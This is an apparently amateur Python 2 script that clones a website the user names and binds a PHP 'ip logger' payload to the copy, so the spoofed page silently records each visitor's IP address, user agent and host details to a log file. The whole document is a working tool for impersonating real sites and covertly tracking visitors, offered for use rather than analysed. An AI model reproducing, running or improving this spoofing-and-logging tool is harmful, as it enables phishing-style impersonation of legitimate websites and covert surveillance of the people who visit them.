#!/usr/bin/env python
debug = False;

import urllib
import time
import os

# check if old file (spoofed.html) exists 
fileName = 'spoofed.html'
fileExists = os.path.isfile(fileName)

# delete spoofed.html if exist (has old data as backup)
# create spoofed.html if not exist
if fileExists:
    os.remove(fileName)
else:
    open(fileName, "w")

try:
    print 'Enter website url to spoof e.g (http://google.com)\n'
    url = raw_input()
    print "\n"
    
except IOError:
    print "Must be used as http://yoursite.com. Exiting."
    exit(1)

# download the website code
#os.system("cls") 
print 'Spoofing '+ url + ', this may take a few bananas' # didn't specify a unit of time here, so Matt W. decided to make it bananas

if urllib.urlretrieve (url, fileName):
    if debug: print url + " -> " + fileName
else:
    if debug: print "Downloading url data failed. Exiting."
    exit(1)

# tell the user we finished
print 'Download completed\n\n'

# store downloaded website content in spoofed.html
fileOpen = open(fileName, 'r')
fileContent = fileOpen.read()
fileOpen.close()

# choose what payloads to add to new webpage
print 'Enter corresponding key to add payload:'
print '[1] Add ip logger'
payload = input()

# ip logger payload
if payload == 1:
    ipLogger = """<?php
$file="iplog.txt";
$f=fopen($file,"a");
fwrite($f,"-------------------------"."\n");
fwrite($f,"IP Address:".$_SERVER["REMOTE_ADDR"]."\n");
fwrite($f,"User Agent:".$_SERVER["HTTP_USER_AGENT"]."\n");
fwrite($f,"Host Name:".php_uname("n")."\n");
fwrite($f,"Operating System:".php_uname("v")."(".php_uname("s").")"."\n");
fclose($f);
?>"""

    newFileName = raw_input("Create new name for php file: eg. google.php: ")
    print '\nBinding an ip logger to ' + newFileName
    
    makePage = open (newFileName, 'a') ## a will append, w will over-write
    makePage.write(ipLogger)           ## write the ip logger module
    makePage.write(fileContent)	       ## write downloaded html/php code
    makePage.close()		           ## discontinue editing of file and save to disk
	
    print '\nBound payload(s) successfully! Exiting in 4 seconds...'
    os.remove(fileName)
    time.sleep(4)		       ## give user time to read
